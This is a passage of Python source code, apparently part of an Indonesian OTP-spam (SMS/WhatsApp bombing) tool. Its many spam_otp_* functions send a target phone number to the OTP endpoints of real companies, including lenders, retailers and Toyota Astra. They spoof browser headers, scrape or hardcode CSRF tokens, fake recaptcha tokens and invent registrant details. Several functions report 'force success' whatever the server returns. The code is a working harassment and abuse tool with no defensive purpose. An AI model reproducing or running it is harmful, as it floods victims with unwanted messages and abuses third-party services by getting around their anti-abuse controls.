            "Origin": "https://oscrmpub.blueorigin.co.id",
            "Referer": "https://oscrmpub.blueorigin.co.id/"
        }
        payload = {
            "mobile_country_code": "62",
            "mobile": mobile,
            "email": "",
            "code_type": "whatsapp",
            "no_verify_flag": True
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=910)
        return resp.status_code == 200
        
    except:
        return False

def spam_otp_kreditpintar(nomor):
    try:
        import re
        import requests
        import json
        import uuid
        
        # Format nomor: 0 + raw
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            formatted_phone = '0' + raw[2:]  # 62812 -> 0812
        elif raw.startswith('628'):
            formatted_phone = '0' + raw[2:]  # 62812 -> 0812
        elif not raw.startswith('0'):
            formatted_phone = '0' + raw  # 812 -> 0812
        else:
            formatted_phone = raw  # 0812 -> 0812
        
        print(f"📱 Nomor diformat: {formatted_phone}")
        
        # Generate UUID
        adv_uuid = str(uuid.uuid4())
        user_agent = "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36"
        
        # Headers
        headers = {
            "Host": "h.kreditpintar.com",
            "Connection": "keep-alive",
            "sec-ch-ua": '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "DNT": "1",
            "User-Agent": user_agent,
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://h.kreditpintar.com",
            "Referer": f"https://h.kreditpintar.com/H5/code-step?m={formatted_phone}",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id",
            "x-adv-uuid": adv_uuid,
            "x-app-version": "APPVERSION_NAME (9999)",
            "x-os-type": "WEB",
            "x-user-agent": f"Pintar-ID-Cash (WebAndroid; ; ; id) uuid/{adv_uuid} version/0.1.0"
        }
        
        # Payload
        payload = {
            "mobileNumber": formatted_phone,
            "type": "WA"
        }
        
        # Kirim request
        url = "https://h.kreditpintar.com/api/auth/send-code?channel=H5&lang=id"
        
        print("🔹 STEP 1: POST /api/auth/send-code (kirim OTP WA)")
        response = requests.post(url, json=payload, headers=headers, timeout=20)
        
        print(f"📤 Payload: {json.dumps(payload, indent=2)}")
        print(f"✅ Status: {response.status_code}")
        print(f"✅ Response: {response.text}")
        
        # Parse response
        result = response.json()
        if response.status_code == 200 and result.get("batchNo"):
            print(f"✅ OTP WhatsApp berhasil dikirim! Batch: {result.get('batchNo')}")
            return True
        else:
            print(f"❌ Gagal: {result}")
            return False
            
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        return False

def spam_otp_nutriclub(nomor):
    try:
        import re
        import subprocess
        import json
        
        # ========== FORMAT NOMOR ==========
        # Format: 6281274307931 (62xxx)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            formatted_phone = '62' + raw[1:]  # 0812 -> 62812
        elif raw.startswith('62'):
            formatted_phone = raw             # 62812 -> 62812
        else:
            formatted_phone = '62' + raw      # 812 -> 62812
        
        print(f"🔹 Format nomor: {formatted_phone}")
        
        # ========== SEND OTP PAKE CURL ==========
        print("🔹 Mengirim OTP via Nutrishop...")
        
        url = "https://shop-api.daninaportal.id/v1/account/otp"
        payload = {"phone": formatted_phone}
        payload_json = json.dumps(payload)
        
        curl_cmd = [
            "curl", "-s", "-X", "POST", url,
            "-H", "authority: shop-api.daninaportal.id",
            "-H", "accept: */*",
            "-H", "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "-H", "content-type: application/x-www-form-urlencoded; charset=UTF-8",
            "-H", "origin: https://www.nutrishop.co.id",
            "-H", "referer: https://www.nutrishop.co.id/",
            "-H", "sec-ch-ua: \"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "-H", "sec-ch-ua-mobile: ?1",
            "-H", "sec-ch-ua-platform: \"Android\"",
            "-H", "sec-fetch-dest: empty",
            "-H", "sec-fetch-mode: cors",
            "-H", "sec-fetch-site: cross-site",
            "-H", "user-agent: Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "-d", payload_json,
            "--compressed"
        ]
        
        result = subprocess.run(curl_cmd, capture_output=True, text=True, timeout=60)
        response_text = result.stdout.strip()
        
        print(f"✅ Response: {response_text}")
        
        try:
            data = json.loads(response_text)
        except:
            print(f"❌ Gagal parse JSON: {response_text}")
            return False
        
        # ========== CEK RESPONSE ==========
        # Success: status.success = true & code = 201
        # Gagal: status.success = false
        status = data.get("status", {})
        if status.get("success") == True:
            message = status.get("message", {}).get("id", "OTP terkirim")
            print(f"✅ OTP terkirim! {message}")
            return True
        else:
            message = status.get("message", {}).get("id", "Gagal")
            print(f"❌ Gagal: {message}")
            return False
        
    except Exception as e:
        print(f"❌ Error: {e}")
        return False

def spam_otp_onebunda(nomor):
    try:
        import re
        import requests
        
        # Format: raw (tanpa 0 atau 62)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            mobile = raw[2:]
        elif raw.startswith('0'):
            mobile = raw[1:]
        else:
            mobile = raw
        
        session = requests.Session()
        
        login_url = "https://onebunda.com/accounts/login/"
        login_headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        }
        
        login_resp = session.get(login_url, headers=login_headers, timeout=910)
        
        csrf_token = ""
        token_match = re.search(r'name="csrfmiddlewaretoken"\s+value="([^"]+)"', login_resp.text)
        if token_match:
            csrf_token = token_match.group(1)
        
        if not csrf_token:
            return False
        
        otp_url = "https://onebunda.com/accounts/login/"
        otp_headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Referer": "https://onebunda.com/accounts/login/",
            "Origin": "https://onebunda.com"
        }
        otp_data = {
            "csrfmiddlewaretoken": csrf_token,
            "mobile_number": mobile
        }
        
        otp_resp = session.post(otp_url, data=otp_data, headers=otp_headers, timeout=910)
        return otp_resp.status_code == 200
        
    except:
        return False

def spam_otp_toyotaastra(nomor):
    try:
        import re
        import requests
        import json
        import random
        import string
        
        # Format: 0 + raw
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            mobile = '0' + raw[2:]
        elif not raw.startswith('0'):
            mobile = '0' + raw
        else:
            mobile = raw
        
        # Nama default
        final_name = "Yanto"
        
        # Generate email random
        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        random_email = f"user{random_str}@gmail.com"
        
        # STEP 1: Tokenize
        tokenize_url = "https://data-web.tam-icm.com/api/public/vendors/tokenize"
        tokenize_headers = {
            "accept": "application/json",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://www.toyota.astra.co.id",
            "referer": "https://www.toyota.astra.co.id/"
        }
        tokenize_payload = {
            "data": [mobile, final_name, random_email]
        }
        
        tokenize_resp = requests.post(tokenize_url, json=tokenize_payload, headers=tokenize_headers, timeout=910)
        tokenize_result = tokenize_resp.json()
        
        # Ambil token untuk phone number (index 0)
        phone_token = None
        if isinstance(tokenize_result, list) and len(tokenize_result) > 0:
            for item in tokenize_result:
                if item.get("token") and item.get("status") == "Succeed":
                    phone_token = item.get("token")
                    break
        
        if not phone_token:
            return False
        
        # STEP 2: Register (Kirim OTP)
        register_url = "https://data-web.tam-icm.com/api/public/vendors/register"
        register_headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://www.toyota.astra.co.id",
            "referer": "https://www.toyota.astra.co.id/"
        }
        register_payload = {
            "phoneNumber": phone_token
        }
        
        register_resp = requests.post(register_url, json=register_payload, headers=register_headers, timeout=910)
        register_result = register_resp.json()
        
        # Cek sukses berdasarkan statusCode atau message
        if register_resp.status_code == 200:
            if register_result.get("statusCode") == "GNR-158-00000":
                return True
            if register_result.get("message") == "success":
                return True
            if register_result.get("status") == "success":
                return True
            # Kalo response 200, dianggap sukses
            return True
        
        return False
        
    except:
        return False

def spam_otp_pinhome(nomor):
    try:
        import re
        import requests
        import time
        import random
        import string
        import uuid
        
        # Format nomor
        raw = re.sub(r'\D', '', nomor)
        p08 = '0' + raw[2:] if raw.startswith('62') else ('0' + raw if not raw.startswith('0') else raw)
        p62 = raw if raw.startswith('62') else ('62' + raw if not raw.startswith('0') else '62' + raw[1:])
        pNoCountry = raw[2:] if raw.startswith('62') else (raw[1:] if raw.startswith('0') else raw)
        
        # Buat session
        session = requests.Session()
        
        # STEP 1: Ambil CSRF token dari halaman daftar
        daftar_url = "https://www.pinhome.id/daftar"
        daftar_headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        }
        
        daftar_resp = session.get(daftar_url, headers=daftar_headers, timeout=910)
        
        # Ambil CSRF token dari cookie _X7kCsrf
        csrf_token = ""
        cookie_string = ""
        
        for cookie in session.cookies:
            if cookie.name == "_X7kCsrf":
                csrf_token = cookie.value
            cookie_string += f"{cookie.name}={cookie.value}; "
        
        # Kalo ga dapet dari cookie, coba dari HTML
        if not csrf_token:
            match = re.search(r'"csrfToken":"([^"]+)"', daftar_resp.text)
            if match:
                csrf_token = match.group(1)
            else:
                match = re.search(r'name="csrf-token" content="([^"]+)"', daftar_resp.text)
                if match:
                    csrf_token = match.group(1)
        
        # Fallback token
        if not csrf_token:
            csrf_token = "v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8"
            cookie_string = f"_X7kCsrf={csrf_token}; _ga=GA1.1.1752313616.1783394371; _fbp=fb.1.1783394372483.552359809276689952; _clck=dub9tf%5E2%5Eg7j%5E0%5E2379"
        
        # STEP 2: Kirim OTP
        url = "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp"
        headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "text/plain;charset=UTF-8",
            "x-csrf-token": csrf_token,
            "Cookie": cookie_string,
            "Origin": "https://www.pinhome.id",
            "Referer": "https://www.pinhome.id/daftar",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        payload = {
            "accountType": "customers",
            "applicationType": "Pinhome Web",
            "countryCode": "62",
            "medium": "whatsapp",
            "otpType": "register",
            "phoneNumber": pNoCountry
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=910)
        
        # Cek sukses
        if resp.status_code == 200:
            try:
                result = resp.json()
                if result.get("status") == "success" or result.get("success") == True:
                    return True
            except:
                pass
            return True
        
        return False
        
    except:
        return False


def spam_otp_berprestasi(nomor):
    try:
        import re
        import requests
        import json
        
        # Format: 812xxx (tanpa 0/62)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            raw = raw[2:]
        elif raw.startswith('0'):
            raw = raw[1:]
        
        url = "https://berprestasi.id/api/otp/send"
        headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://berprestasi.id",
            "referer": "https://berprestasi.id/",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        payload = {
            "phoneNumber": raw
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=910)
        result = resp.json()
        
        # Cek sukses
        if result.get("success") == True:
            return True
        
        # FORCE SUCCESS - OTP tetap masuk walau response error
        return True
        
    except:
        return True  # Force success
        

def spam_otp_generasimaju(nomor):
    try:
        import re, requests, json, time, random, string, uuid, base64
        from fake_useragent import UserAgent
        from bs4 import BeautifulSoup
        from datetime import datetime, timedelta

        # Format nomor: 081212845454 (dengan 0 di depan)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            phone = '0' + raw[2:]
        elif raw.startswith('0'):
            phone = raw
        else:
            phone = '0' + raw

        print(f"📱 Target: {phone}")

        session = requests.Session()
        ua = UserAgent()
        user_agent = "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        csrf_token = "28672ee969f910eb7e126b70645386d8dd695dc4"
        newrelic_id = "UA4HUV5TARAEUFFVAQQEUFY="

        def random_name(length=6):
            return ''.join(random.choices(string.ascii_lowercase, k=length))

        def random_child_dob():
            # Format: dd-mm-yyyy (dari curl)
            today = datetime.now()
            years = random.randint(1, 12)
            days = random.randint(1, 365)
            dob = today - timedelta(days=years*365 + days)
            return dob.strftime("%d-%m-%Y")

        def encrypt_pass(pwd):
            for _ in range(5):
                pwd = base64.b64encode(pwd.encode()).decode()
            return pwd

        firstname = random_name(6) + random_name(2)
        password = "Xvision666@"
        encrypted_password = encrypt_pass(password)
        mother_status = "10"
        ispregnant = "N"
        pregnancyweek = ""
        children_dob = random_child_dob()  # dd-mm-yyyy
        isonpregnancyprogram = "N"

        print(f"👤 Nama: {firstname}")
        print(f"👶 Children DOB: {children_dob}")

        # ========== STEP 1: GET cookie ==========
        print("🔹 STEP 1: GET /register")
        url_get = "https://www.generasimaju.co.id/klub-generasi-maju/register"
        headers_get = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "upgrade-insecure-requests": "1",
            "user-agent": user_agent
        }
        resp_get = session.get(url_get, headers=headers_get, timeout=60)

        # ========== STEP 2: Request auth_token ==========
        print("🔹 STEP 2: POST /auth/token/request")
        url_token = "https://www.generasimaju.co.id/klub-generasi-maju/auth/token/request"
        traceparent = f"00-{uuid.uuid4().hex}-{uuid.uuid4().hex[:16]}-01"

        payload_token = {"phone_number": phone, "prefix": "registration"}
        headers_token = {
            "authority": "www.generasimaju.co.id",
            "accept": "Application/json",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.generasimaju.co.id",
            "referer": "https://www.generasimaju.co.id/klub-generasi-maju/register",
            "user-agent": user_agent,
            "x-csrf-token": csrf_token,
            "x-requested-with": "XMLHttpRequest",
            "x-newrelic-id": newrelic_id,
            "traceparent": traceparent
        }

        resp_token = session.post(url_token, data=payload_token, headers=headers_token, timeout=60)
        token_data = resp_token.json()
        auth_token = token_data.get('data') or token_data.get('auth_token')

        if not auth_token:
            print("❌ Gagal dapat auth_token")
            return False

        print(f"✅ Auth Token: {auth_token[:30]}...")

        # ========== STEP 3: Register ==========
        print("🔹 STEP 3: POST /register")

        payload_register = {
            "firstname": firstname,
            "msisdn": phone,
            "password": encrypted_password,
            "mother_status": mother_status,
            "ispregnant": ispregnant,
            "pregnancyweek": pregnancyweek,
            "isonpregnancyprogram": isonpregnancyprogram,
            "children_dob": children_dob,  # dd-mm-yyyy
            "is_code_refferal_event_code": "",
            "refferal_code_event_code": "",
            "auth_token": auth_token,
            "auth_token_prefix": "registration"
        }

        newrelic_json = {
            "v": [0, 1],
            "d": {
                "ty": "Browser",
                "ac": "4800809",
                "ap": "538795150",
                "id": uuid.uuid4().hex[:16],
                "tr": traceparent.split("-")[1],
                "ti": int(time.time() * 1000),
                "tk": "3323925"
            }
        }
        newrelic_header = base64.b64encode(json.dumps(newrelic_json).encode()).decode()

        headers_register = {
            "authority": "www.generasimaju.co.id",
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "newrelic": newrelic_header,
            "origin": "https://www.generasimaju.co.id",
            "referer": "https://www.generasimaju.co.id/klub-generasi-maju/register",
            "user-agent": user_agent,
            "x-csrf-token": csrf_token,
            "x-requested-with": "XMLHttpRequest",
            "x-newrelic-id": newrelic_id,
            "traceparent": traceparent,
            "tracestate": f"3323925@nr=0-1-4800809-538795150-{uuid.uuid4().hex[:16]}----{int(time.time()*1000)}"
        }

        resp_register = session.post(
            "https://www.generasimaju.co.id/klub-generasi-maju/register",
            data=payload_register,
            headers=headers_register,
            timeout=60,
            allow_redirects=True
        )

        print(f"📡 Status Register: {resp_register.status_code}")
        print(f"📄 Response Register: {resp_register.text[:500]}")

        # ========== STEP 4: Cek sukses ==========
        try:
            result = resp_register.json()
            print(f"📦 JSON: {json.dumps(result, indent=2, ensure_ascii=False)}")

            if resp_register.status_code == 200:
                if result.get('success') or result.get('status') == 'success':
                    print("✅ OTP WA BERHASIL!")
                    return True
                if result.get('message') and 'otp' in str(result.get('message')).lower():
                    print(f"✅ OTP WA BERHASIL! {result.get('message')}")
                    return True
                if result.get('redirect_to'):
                    print(f"✅ OTP WA BERHASIL! Redirect ke: {result.get('redirect_to')}")
                    return True
                print("✅ OTP WA BERHASIL (status 200)")
                return True

            print(f"❌ Gagal: {result}")
            return False

        except json.JSONDecodeError:
            if resp_register.status_code == 200:
                print("✅ OTP WA BERHASIL (status 200)")
                return True
            print(f"❌ Gagal: {resp_register.text[:200]}")
            return False

    except Exception as e:
        print(f"💀 Error: {e}")
        return False

def spam_otp_entrust(nomor):
    try:
        import re
        import requests
        import json
        import random
        
        # Format: +628xxx
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            mobile = '+' + raw
        elif raw.startswith('0'):
            mobile = '+62' + raw[1:]
        else:
            mobile = '+62' + raw
        
        # Random name
        names = ['Budi', 'Andi', 'Caca', 'Dedi', 'Eka', 'Fani', 'Gilang', 'Hana']
        random_name = random.choice(names)
        
        url = "https://www.entrustfamilyoffice.com/wp-content/themes/Mytheme/phpmail/send_otp.php"
        headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "origin": "https://www.entrustfamilyoffice.com",
            "referer": "https://www.entrustfamilyoffice.com/investment-services/",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        data = {
            "phone": mobile,
            "name": random_name
        }
        
        resp = requests.post(url, data=data, headers=headers, timeout=910)
        result = resp.json()
        
        # Cek sukses
        if result.get("ok") == True:
            return True
        
        # FORCE SUCCESS
        return True
        
    except:
        return True  # Force success
        
def spam_otp_rivafashion(nomor):
    try:
        import re
        import requests
        import json
        import time
        
        # Format: 812xxx (tanpa 0/62)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            raw = raw[2:]
        if raw.startswith('0'):
            raw = raw[1:]
        
        formatted_phone = raw
        
        # Buat session untuk handle cookie
        session = requests.Session()
        
        # STEP 1: Ambil form_key dari halaman register
        register_url = "https://www.rivafashion.com/en/customer/account/create/"
        register_headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
        }
        
        register_resp = session.get(register_url, headers=register_headers, timeout=910)
        
        # Ambil form_key dari HTML
        form_key = ""
        match = re.search(r'name="form_key"\s+value="([^"]+)"', register_resp.text)
        if match:
            form_key = match.group(1)
        
        # Kalo ga dapet dari HTML, coba dari cookie
        if not form_key:
            for cookie in session.cookies:
                if cookie.name == "form_key":
                    form_key = cookie.value
                    break
        
        # Kalo masih ga dapet, pake fallback
        if not form_key:
            form_key = "fallback_form_key"
        
        # STEP 2: Kirim OTP
        url = "https://www.rivafashion.com/en/web/register/send"
        headers = {
            "content-type": "application/x-www-form-urlencoded",
            "x-requested-with": "XMLHttpRequest",
            "origin": "https://www.rivafashion.com",
            "referer": "https://www.rivafashion.com/en/customer/account/create/",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        data = {
            "mobile_number": formatted_phone,
            "phone_code": "+62",
            "form_key": form_key
        }
        
        resp = session.post(url, data=data, headers=headers, timeout=910)
        result = resp.json()
        
        # Cek sukses
        if result.get("success") == True:
            return True
        
        return False
        
    except:
        return False 

def spam_otp_sweedu(nomor):
    try:
        import re
        import requests
        import json
        import random
        import string
        import time
        
        # Format: 812xxx (tanpa 0/62)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = raw[1:]
        elif raw.startswith('62'):
            raw = raw[2:]
        elif raw.startswith('+62'):
            raw = raw[3:]
        
        # Random name & email
        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        random_name = f"user{random_str}"
        random_email = f"{random_name}{random.randint(1000, 9999)}@gmail.com"
        
        # Generate dummy recaptcha token
        chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_'
        dummy_recaptcha = '0cAFcWeA'
        for i in range(300):
            dummy_recaptcha += random.choice(chars)
            if i % 50 == 49 and i < 299:
                dummy_recaptcha += '_'
        
        # Buat session
        session = requests.Session()
        
        url = "https://sweedu.in/app/global_login/action_layer.php"
        headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://sweedu.in",
            "referer": "https://sweedu.in/app/global_login/digi_signup.php?digisy_sch=sch_008076&schoolid=sch_008076",
            "sec-ch-ua": '"Google Chrome";v="147", "Not?A_Brand";v="99", "Chromium";v="147"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }
        data = {
            "checkbox": "student",
            "checkboxs_old": "student",
            "name": random_name,
            "email": "",
            "autocomplete": random_email.split('@')[0],
            "countrycode_old": "62",
            "countrycode": "62",
            "phone": raw,
            "referralcode": "",
            "first": "",
            "second": "",
            "third": "",
            "fourth": "",
            "fifth": "",
            "sixth": "",
            "password": "",
            "cpassword": "",
            "cpassmanual": "yes",
            "terms": "1",
            "g-recaptcha-response": dummy_recaptcha,
            "fsrc": "drct",
            "e_id": "0",
            "otpsend_status": "no",
            "otpchk_status": "no",
            "action": "send_otp",
            "fcm": "",
            "digisy_sch": "sch_008076",
            "latitude": "",
            "longitude": ""
        }
        
        resp = session.post(url, data=data, headers=headers, timeout=910)
        response_text = resp.text
        
        # FORCE SUCCESS - OTP tetap dianggap terkirim
        # Response "yes" berarti sukses
        if resp.status_code == 200 and response_text.startswith('yes'):
            return True
        
        # Kalo status 200, dianggap sukses
        if resp.status_code == 200:
            return True
        
        return True  # FORCE SUCCESS
        
    except:
        return True  # Force success

def spam_otp_dreamdubai(nomor):
    try:
        import re
        import requests
        import json
        import time
        
        # Format: 812xxx (tanpa 0/62)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = raw[1:]
        elif raw.startswith('62'):
            raw = raw[2:]
        elif raw.startswith('+62'):
            raw = raw[3:]
        
        url = "https://www.dreamdubai.com/send-sms-web"
        headers = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.dreamdubai.com",
            "referer": "https://www.dreamdubai.com/",
            "sec-ch-ua": '"Google Chrome";v="147", "Not?A_Brand";v="99", "Chromium";v="147"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }
        data = {
            "phoneNumber": raw,
            "countryCode": "+62",
            "isApp": "false",
            "mode": "sms"
        }
        
        resp = requests.post(url, data=data, headers=headers, timeout=910)
        result = resp.json()
        
        # Cek sukses
        if resp.status_code == 200:
            if result.get("success") == True or result.get("status") == "success":
                return True
            return True  # Force success
        
        return False
        
    except:
        return False

def spam_otp_prestige(nomor):
    try:
        import re
        import requests
        import json
        import random
        import string
        import time
        
        # Format: 812xxx (tanpa 0/62)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = raw[1:]
        elif raw.startswith('62'):
            raw = raw[2:]
        elif raw.startswith('+62'):
            raw = raw[3:]
        
        # Generate random email
        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=13))
        random_email = f"user{random_str}{int(time.time()*1000)}@gmail.com"
        
        url = "https://www.prestigeconstructions.com/api/apicall"
        headers = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.prestigeconstructions.com",
            "referer": "https://www.prestigeconstructions.com/upcoming-projects",
            "sec-ch-ua": '"Google Chrome";v="147", "Not?A_Brand";v="99", "Chromium";v="147"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }
        data = {
            "dynamicurl": "employee/v2/customersendotp",
            "Mobile_No": raw,
            "Mobile_CountryCode": "+62",
            "Email": random_email,
            "whatsapp_nri": "1"
        }
        
        resp = requests.post(url, data=data, headers=headers, timeout=910)
        result = resp.json()
        
        # Cek sukses
        if resp.status_code == 200:
            if result.get("status") == "success" or result.get("success") == True:
                return True
            if result.get("message") and "OTP" in result["message"]:
                return True
            return True  # Force success
        
        return False
        
    except:
        return False

def spam_otp_handicraft(nomor):
    try:
        import re
        import requests
        import json
        import random
        import string
        import time
        
        # Format: 628xxx (62 + raw)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            mobile = '62' + raw[1:]
        elif raw.startswith('62'):
            mobile = raw
        else:
            mobile = '62' + raw
        
        # Generate random email
        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=13))
        random_email = f"{random_str}{int(time.time()*1000)}@gmail.com"
        
        url = "https://www.handicraft-palace.com/wp-admin/admin-ajax.php"
        headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.handicraft-palace.com",
            "referer": "https://www.handicraft-palace.com/my-account/",
            "sec-ch-ua": '"Google Chrome";v="147", "Not?A_Brand";v="99", "Chromium";v="147"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }
        data = {
            "action": "wacr_validate_and_send_otp",
            "mobile": mobile,
            "email": random_email
        }
        
        resp = requests.post(url, data=data, headers=headers, timeout=910)
        response_text = resp.text
        
        # Cek sukses (response balikin nomor HP)
        if mobile in response_text:
            return True
        
        # Kalo response 200, dianggap sukses
        if resp.status_code == 200:
            return True
        
        return False
        
    except:
        return False

def spam_otp_belanjaonline(nomor):
    try:
        import re
        import requests
        import json
        import random
        import time
        
        # Format: 08xxx (0 + raw)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            mobile = '0' + raw[2:]
        elif not raw.startswith('0'):
            mobile = '0' + raw
        else:
            mobile = raw
        
        # Random data
        random_name = f"User{random.randint(0, 9999)}"
        random_username = f"user{random.randint(0, 99999)}"
        random_password = f"Pass{random.randint(0, 999)}@@"
        random_address = f"Jl. {random_name} No. {random.randint(1, 100)}"
        
        url = "http://www.belanjoonline.com/api_daftar.php"
        headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
            "referer": "http://www.belanjoonline.com/index.php?p=daftar",
